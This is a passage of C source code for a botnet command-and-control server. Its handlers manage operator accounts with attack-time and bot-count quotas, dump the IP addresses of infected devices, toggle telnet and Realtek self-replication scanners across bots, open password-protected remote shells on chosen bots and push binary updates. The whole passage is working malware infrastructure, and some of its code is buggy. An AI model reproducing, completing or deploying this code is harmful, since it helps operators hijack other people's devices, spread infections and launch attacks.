    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int timeidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + timeidx, sizeof(buffer) - 1 - timeidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = timeidx; i < timeidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        timeidx += len;
        if (found) break;
        if (timeidx >= (int)sizeof(buffer) - 1) return;
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxtime) != 1 || maxtime <= 0) {
        snprintf(response, sizeof(response), RESET "Invalid max time value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    snprintf(response, sizeof(response), BLUE "Max bots: " RESET);
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
    int botsidx = 0;
    memset(buffer, 0, sizeof(buffer));
    while (1) {
        len = recv(client_socket, buffer + botsidx, sizeof(buffer) - 1 - botsidx, 0);
        if (len <= 0) return;
        int found = 0;
        for (int i = botsidx; i < botsidx + len; i++) {
            if (buffer[i] == '\n' || buffer[i] == '\r') {
                buffer[i] = 0;
                found = 1;
                break;
            }
        }
        botsidx += len;
        if (found) break;
        if (botsidx >= (int)sizeof(buffer) - 1) return;
    }
    buffer[strcspn(buffer, "\r\n")] = 0;
    if (sscanf(buffer, "%d", &maxbots) != 1 || maxbots <= 0) {
        snprintf(response, sizeof(response), RESET "Invalid max bots value\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    FILE *fp = fopen("database/logins.txt", "a");
    if (!fp) {
        snprintf(response, sizeof(response), RESET "Error: Could not open user database\r\n" RESET);
        send(client_socket, response, strlen(response), MSG_NOSIGNAL);
        return;
    }
    
    fprintf(fp, "%s %s %d %d %s\n", newuser, newpass, maxtime, maxbots, is_admin ? "admin" : "0");
    fclose(fp);

    if (user_count < MAX_USERS) {
        strncpy(users[user_count].user, newuser, sizeof(users[user_count].user)-1);
        users[user_count].user[sizeof(users[user_count].user)-1] = 0;
        strncpy(users[user_count].pass, newpass, sizeof(users[user_count].pass)-1);
        users[user_count].pass[sizeof(users[user_count].pass)-1] = 0;
        users[user_count].maxtime = maxtime;
        users[user_count].maxbots = maxbots;
        users[user_count].is_admin = is_admin;
        users[user_count].is_logged_in = 0;
        user_count++;
    }

    snprintf(response, sizeof(response), 
        YELLOW "User added successfully:\r\n"
        "Username: " RESET "%s" YELLOW "\r\n"
        "Max time: " RESET "%d" YELLOW "\r\n"
        "Max bots: " RESET "%d" YELLOW "\r\n"
        "Admin: " RESET "%s" YELLOW "\r\n" RESET,
        newuser, maxtime, maxbots, is_admin ? "yes" : "no");
    send(client_socket, response, strlen(response), MSG_NOSIGNAL);
}

void handle_removeuser_command(const User *user, const char *command, char *response) {
    FILE *sf = fopen("database/settings.txt", "r");
    char rootuser[50] = {0};
    int is_root = 0;
    
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %49s", rootuser);
                if (strcmp(user->user, rootuser) == 0) {
                    is_root = 1;
                }
                break;
            }
        }
        fclose(sf);
    }

    if (!is_root) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Only root user can remove users\r\n" RESET);
        return;
    }    char target[50];
    if (sscanf(command, "!removeuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Usage: !removeuser <username>\r\n" RESET);
        return;
    }

    if (strcmp(target, rootuser) == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Cannot remove root user\r\n" RESET);
        return;
    }

    FILE *f = fopen("database/logins.txt", "r");
    FILE *temp = fopen("database/logins.tmp", "w");
    if (!f || !temp) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Failed to remove user\r\n" RESET);
        if (f) fclose(f);
        if (temp) fclose(temp);
        return;
    }

    char line[256];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char current[50];
        if (sscanf(line, "%49s", current) == 1) {
            if (strcmp(current, target) != 0) {
                fputs(line, temp);
            } else {
                found = 1;
            }
        }
    }

    fclose(f);
    fclose(temp);

    if (found) {
        remove("database/logins.txt");
        rename("database/logins.txt", "database/logins.txt");
        load_users();
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "User %s removed\r\n" RESET, target);
    } else {
        remove("logins.tmp");
        snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
    }
}

void handle_kickuser_command(const User *user, const char *command, char *response) {
    static char target[50];
    static int allow_non_admin;
    static int found;
    
    if (!user->is_admin) {
        FILE *sf = fopen("database/settings.txt", "r");
        allow_non_admin = 0;
        if (sf) {
            char line[128];
            while (fgets(line, sizeof(line), sf)) {
                if (strncmp(line, "globalstopall:", 13) == 0 && strstr(line, "yes")) {
                    allow_non_admin = 1;
                    break;
                }
            }
            fclose(sf);
        }
        if (!allow_non_admin) {
            snprintf(response, MAX_COMMAND_LENGTH, RESET "Error: You need to be admin or have globalstopall enabled to kick users\r\n" RESET);
            return;
        }
    }

    if (sscanf(command, "!kickuser %49s", target) != 1) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Usage: !kickuser <username>\r\n" RESET);
        return;
    }

    found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) {
            if (!users[i].is_logged_in) {
                snprintf(response, MAX_COMMAND_LENGTH, RESET "User not connected\r\n" RESET);
                return;
            }
            for (int j = 0; j < MAX_USERS; j++) {
                if (user_sockets[j] > 0) {
                    shutdown(user_sockets[j], SHUT_RDWR);
                    close(user_sockets[j]);
                    user_sockets[j] = 0;
                }
            }
            users[i].is_logged_in = 0;
            found = 1;
            break;
        }
    }

    if (found) {
        snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Kicked user %s\r\n" RESET, target);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "User not found\r\n" RESET);
    }
}

void handle_admin_command(const User *user, char *response) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Only admins can use !admin command\r\n" RESET);
        return;
    }
    snprintf(response, MAX_COMMAND_LENGTH,
             LIGHT_BLUE "!shell" YELLOW " - " RESET "Send command to a device\r\n"
             LIGHT_BLUE "!adduser" YELLOW " - " RESET "Add a new user\r\n"
             LIGHT_BLUE "!selfrep" YELLOW " - " RESET "toggle selfreps <telnet on|off>\r\n"
             LIGHT_BLUE "!botdump" YELLOW " - " RESET "Dumps active bots into a file\r\n"
             LIGHT_BLUE "!removeuser" YELLOW " - " RESET "Remove a user\r\n"
             LIGHT_BLUE "!kickuser" YELLOW " - " RESET "Kick a connected user\r\n"
             LIGHT_BLUE "!openshell" YELLOW " - " RESET "Open shell on bot (root only)\r\n" RESET);
}

void handle_ping_command(char *response) {
    int valid_bots = 0;
    pthread_mutex_lock(&bot_mutex);
    int count = bot_count;
    if (count > MAX_BOTS) count = MAX_BOTS;
    for (int i = 0; i < count; i++) {
        if (bots[i].is_valid && bots[i].socket > 0) valid_bots++;
    }
    pthread_mutex_unlock(&bot_mutex);
}


void handle_botdump_command(const User *user, char *response, const char *sarch, const char *sgroup, const char *filename) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Admin needed to dump bots\r\n" RESET);
        return;
    }

    int has_sarch = (sarch && sarch[0]);
    int has_sgroup = (sgroup && sgroup[0]);

    char path[256];
    if (filename && filename[0]) {
        snprintf(path, sizeof(path), "database/dumps/%s", filename);
    } else {
        snprintf(path, sizeof(path), "database/botsdumped.txt");
    }
    FILE *fp = fopen(path, "w");
    if (!fp) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Error: Could not dump bots, exiting...\r\n" RESET);
        return;
    }

    int dumped = 0;
    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid || bots[i].socket <= 0) continue;
        int arch_match = 1;
        int group_match = 1;
        if (has_sarch) {
            arch_match = 0;
            char *saveptr1;
            char sarch_copy[128];
            strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
            sarch_copy[sizeof(sarch_copy)-1] = 0;
            char *tok = strtok_r(sarch_copy, ",", &saveptr1);
            while (tok) {
                if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                tok = strtok_r(NULL, ",", &saveptr1);
            }
            if (!arch_match) continue;
        }
        if (has_sgroup) {
            if (!has_sarch) {
                snprintf(response, MAX_COMMAND_LENGTH, RED "sgroup= requires sarch=\n" RESET);
                pthread_mutex_unlock(&bot_mutex);
                fclose(fp);
                return;
            }
            group_match = 0;
            char *saveptr2;
            char sgroup_copy[128];
            strncpy(sgroup_copy, sgroup, sizeof(sgroup_copy)-1);
            sgroup_copy[sizeof(sgroup_copy)-1] = 0;
            char *tok2 = strtok_r(sgroup_copy, ",", &saveptr2);
            while (tok2) {
                if (strcmp(tok2, bots[i].group) == 0) { group_match = 1; break; }
                tok2 = strtok_r(NULL, ",", &saveptr2);
            }
            if (!group_match) continue;
        }
        struct sockaddr_in addr;
        socklen_t addr_len = sizeof(addr);
        if (getpeername(bots[i].socket, (struct sockaddr*)&addr, &addr_len) == 0) {
            fprintf(fp, "%s:%d:%s\n", 
                inet_ntoa(addr.sin_addr), 
                ntohs(addr.sin_port),
                bots[i].arch ? bots[i].arch : "unknown");
            dumped++;
        }
    }
    pthread_mutex_unlock(&bot_mutex);
    fclose(fp);

    if (dumped == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RED "No matching bots or less than 1\n" RESET);
        return;
    }

    snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Successfully dumped %d bots\r\n" RESET, dumped);
}

void handle_selfrep_command(const User *user, const char *command, char *response, const char *scanner_type, const char *action, const char *sarch, const char *sgroup) {
    if (!user->is_admin) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Error: only admins can run this command\r\n" RESET);
        return;
    }

    if (!scanner_type || !action) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Available scanners: telnet, realtek\r\n" RESET);
        return;
    }

    if (strcmp(scanner_type, "telnet") != 0 && strcmp(scanner_type, "realtek") != 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "available scanners: telnet, realtek\r\n" RESET);
        return;
    }

    if (strcmp(action, "on") != 0 && strcmp(action, "off") != 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "Invalid option [2]. on|off\r\n" RESET);
        return;
    }

    int has_sarch = (sarch && sarch[0]);
    int has_sgroup = (sgroup && sgroup[0]);
    int sent_count = 0;

    pthread_mutex_lock(&bot_mutex);
    for (int i = 0; i < bot_count; i++) {
        if (!bots[i].is_valid) continue;
        int arch_match = 1;
        int group_match = 1;
        if (has_sarch) {
            arch_match = 0;
            char *saveptr1;
            char sarch_copy[128];
            strncpy(sarch_copy, sarch, sizeof(sarch_copy)-1);
            sarch_copy[sizeof(sarch_copy)-1] = 0;
            char *tok = strtok_r(sarch_copy, ",", &saveptr1);
            while (tok) {
                if (strcmp(tok, bots[i].arch) == 0) { arch_match = 1; break; }
                tok = strtok_r(NULL, ",", &saveptr1);
            }
            if (!arch_match) continue;
        }
        if (has_sgroup) {
            if (!has_sarch) continue;
            group_match = 0;
            char *saveptr2;
            char sgroup_copy[128];
            strncpy(sgroup_copy, sgroup, sizeof(sgroup_copy)-1);
            sgroup_copy[sizeof(sgroup_copy)-1] = 0;
            char *tok2 = strtok_r(sgroup_copy, ",", &saveptr2);
            while (tok2) {
                if (strcmp(tok2, bots[i].group) == 0) { group_match = 1; break; }
                tok2 = strtok_r(NULL, ",", &saveptr2);
            }
            if (!group_match) continue;
        }
        send(bots[i].socket, command, strlen(command), MSG_NOSIGNAL);
        sent_count++;
    }
    pthread_mutex_unlock(&bot_mutex);

    if (sent_count == 0) {
        snprintf(response, MAX_COMMAND_LENGTH, RESET "No matching bots found\r\n" RESET);
        return;
    }

    snprintf(response, MAX_COMMAND_LENGTH, LIGHT_BLUE "Selfrep %s has been toggled %s for %d bots\r\n" RESET, 
             scanner_type, action, sent_count);
}

void handle_openshell_command(const User *user, const char *command, int client_socket) {
    char filename[128] = {0};
    int has_filename = 0;
    char rootuser[64] = {0};
    FILE *sf = fopen("database/settings.txt", "r");
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %63s", rootuser);
                break;
            }
        }
        fclose(sf);
    }
    if (strcmp(user->user, rootuser) != 0) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "only root-user can use this command\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    int port = 0;
    char password[16] = {0};
    char bot_filter[32] = {0};
    int has_botfilter = 0;
    int has_botcount = 0;
    char cmd_copy[256];
    strncpy(cmd_copy, command, sizeof(cmd_copy)-1);
    cmd_copy[sizeof(cmd_copy)-1] = 0;
    char *tokens[8] = {0};
    int token_count = 0;
    char *tok = strtok(cmd_copy, " ");
    while (tok && token_count < 8) {
        tokens[token_count++] = tok;
        tok = strtok(NULL, " ");
    }
    if (token_count < 3) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Usage: !openshell <port> <password> (password max 8 chars)\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    port = atoi(tokens[1]);
    strncpy(password, tokens[2], sizeof(password)-1);
    password[sizeof(password)-1] = 0;
    if (port < 1 || port > 65535) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid port (must be 1-65535)\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    if (strlen(password) > 8) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Password too long (max 8 chars)\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    for (int i = 3; i < token_count; ++i) {
        if (strncmp(tokens[i], "bot=", 4) == 0) {
            strncpy(bot_filter, tokens[i]+4, sizeof(bot_filter)-1);
            bot_filter[sizeof(bot_filter)-1] = 0;
            if (strchr(bot_filter, '/')) {
                snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "bot= only supports single IPv4, not subnet\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
            if (!validate_ip_or_subnet(bot_filter)) {
                snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid bot= value (must be IPv4)\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
            has_botfilter = 1;
        } else if (strncmp(tokens[i], "botcount=", 9) == 0) {
            const char *val = tokens[i] + 9;
            if (!*val) {
                snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid botcount (need int)\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
            char *endptr = NULL;
            long botcount_val = strtol(val, &endptr, 10);
            if (!endptr || *endptr != '\0' || botcount_val <= 0) {
                snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid botcount (need int > 0)\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
            has_botcount = 1;
        } else if (strncmp(tokens[i], "filename=", 9) == 0) {
            if (has_filename) {
                snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Duplicate filename argument\n" RESET);
                send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
                return;
            }
            strncpy(filename, tokens[i] + 9, sizeof(filename) - 1);
            filename[sizeof(filename) - 1] = 0;
            has_filename = 1;
        } else {
            snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Unknown argument: %s\n" RESET, tokens[i]);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
    }
    if (has_filename && (!filename[0] || strchr(filename, '/'))) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid filename argument\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    if (has_botfilter && has_botcount) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "botcount= cannot be used with bot=%s\n" RESET, bot_filter);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    }
    if (port < 1 || port > 65535) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Invalid port (must be 1-65535)\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    } else if (strlen(password) > 8) {
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "Password too long (max 8 chars)\n" RESET);
        send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
        return;
    } else {
        pthread_mutex_lock(&bot_mutex);
        int sent_bots = 0;
        char bot_command[64];
        snprintf(bot_command, sizeof(bot_command), "!openshell %d %s", port, password);
        int found_bot = 0;
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                if (has_botfilter) {
                    char bot_ip[32];
                    strncpy(bot_ip, inet_ntoa(bots[i].address.sin_addr), sizeof(bot_ip)-1);
                    bot_ip[sizeof(bot_ip)-1] = 0;
                    if (strcmp(bot_ip, bot_filter) != 0) continue;
                    found_bot = 1;
                }
                if (!has_botfilter || found_bot) {
                    send(bots[i].socket, bot_command, strlen(bot_command), MSG_NOSIGNAL);
                    sent_bots++;
                }
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        if (has_botfilter && !found_bot) {
            snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET RESET "bot not connected\n" RESET);
            send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
            return;
        }
        char path[256];
        if (has_filename && filename[0]) {
            snprintf(path, sizeof(path), "database/dumps/%s", filename);
        } else {
            snprintf(path, sizeof(path), "database/botsdumped.txt");
        }
        FILE *fp = fopen(path, "a");
        if (fp) {
            for (int i = 0; i < bot_count; i++) {
                if (bots[i].is_valid) {
                    if (has_botfilter) {
                        char bot_ip[32];
                        strncpy(bot_ip, inet_ntoa(bots[i].address.sin_addr), sizeof(bot_ip)-1);
                        bot_ip[sizeof(bot_ip)-1] = 0;
                        if (strcmp(bot_ip, bot_filter) != 0) continue;
                    }
                    struct sockaddr_in addr;
                    socklen_t addr_len = sizeof(addr);
                    if (getpeername(bots[i].socket, (struct sockaddr*)&addr, &addr_len) == 0) {
                        fprintf(fp, "[SHELL-OPENED]-%s:%d:%s\n", inet_ntoa(addr.sin_addr), port, password);
                    }
                }
            }
            fclose(fp);
        }
        snprintf(response_buf, sizeof(response_buf), LIGHT_BLUE "> " RESET LIGHT_BLUE "Attempting to open shell on %d bots... Dumped!\n" RESET, sent_bots);
    }
    send(client_socket, response_buf, strlen(response_buf), MSG_NOSIGNAL);
}

void handle_update_command(const User *user, char *response) {
    FILE *sf = fopen("database/settings.txt", "r");
    char rootuser[64] = {0};
    int is_root = 0;
    if (sf) {
        char line[128];
        while (fgets(line, sizeof(line), sf)) {
            if (strncmp(line, "rootuser:", 9) == 0) {
                sscanf(line + 9, " %63s", rootuser);
                break;
            }
        }
        fclose(sf);
    }
    if (user && strcmp(user->user, rootuser) == 0) {
        pthread_mutex_lock(&bot_mutex);
        int sent = 0;
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                send(bots[i].socket, "!update", 7, MSG_NOSIGNAL);
                sent++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);
        snprintf(response, MAX_COMMAND_LENGTH, GREEN "Updating binary on %d bots\n" RESET, sent);
    } else {
        snprintf(response, MAX_COMMAND_LENGTH, RED "Only rootuser can run !update\n" RESET);
    }
}

int validate_ip_or_subnet(const char *ip) {
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) return 0;
    }
    struct in_addr addr;
    return inet_aton(buf, &addr);
}